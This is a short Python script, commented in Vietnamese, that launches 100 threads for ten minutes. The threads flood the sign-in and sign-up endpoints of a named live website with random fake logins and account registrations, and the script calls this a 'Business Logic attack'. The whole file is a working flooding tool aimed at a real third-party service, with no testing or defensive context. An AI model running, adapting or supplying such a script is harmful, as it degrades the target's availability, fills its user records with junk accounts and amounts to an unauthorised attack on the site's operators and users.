import requests
import threading
import random
import string
import time
import sys

# --- CẤU HÌNH ---
TARGET_HOST = "https://applep12.com"
ENDPOINTS = {
    "signin": "/Account/Signin",
    "signup": "/Account/Signup"
}
THREAD_COUNT = 100 # Số luồng cho mỗi máy ảo GitHub
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Referer': f'{TARGET_HOST}/'
}
# --- KẾT THÚC CẤU HÌNH ---

STOP_FLAG = False
request_count = 0
error_count = 0

def generate_random_string(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(length))

def attack():
    global request_count, error_count
    session = requests.Session()
    session.headers.update(HEADERS)
    
    while not STOP_FLAG:
        try:
            action = random.choice(list(ENDPOINTS.keys()))
            url = TARGET_HOST + ENDPOINTS[action]
            
            email = f"{generate_random_string(8)}@test.com"
            password = generate_random_string(16)
            
            if action == "signin":
                payload = { 'UserName': email, 'password': password, 'IsPersistent': 'true' }
            else: # signup
                payload = { 'Email': email, 'Password': password, 'ConfirmPassword': password, 'AgreeTerms': 'on' }

            response = session.post(url, data=payload, timeout=10)
            request_count += 1
            if response.status_code >= 400:
                error_count += 1

        except requests.exceptions.RequestException:
            error_count += 1
        
        time.sleep(0.1)

def print_status():
    while not STOP_FLAG:
        sys.stdout.write(f"\rRequests: {request_count} | Errors: {error_count}  ")
        sys.stdout.flush()
        time.sleep(1)

def main():
    global STOP_FLAG
    threads = []
    print(f"[*] Starting Business Logic attack with {THREAD_COUNT} threads.")
    
    status_thread = threading.Thread(target=print_status)
    status_thread.daemon = True
    status_thread.start()

    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    try:
        time.sleep(600) # Chạy trong 10 phút
    finally:
        print("\n[*] Time limit reached. Stopping attack.")
        STOP_FLAG = True
        for thread in threads:
            thread.join()
        print(f"[*] Attack stopped. Total requests: {request_count}, Errors: {error_count}")

if __name__ == "__main__":
    main()
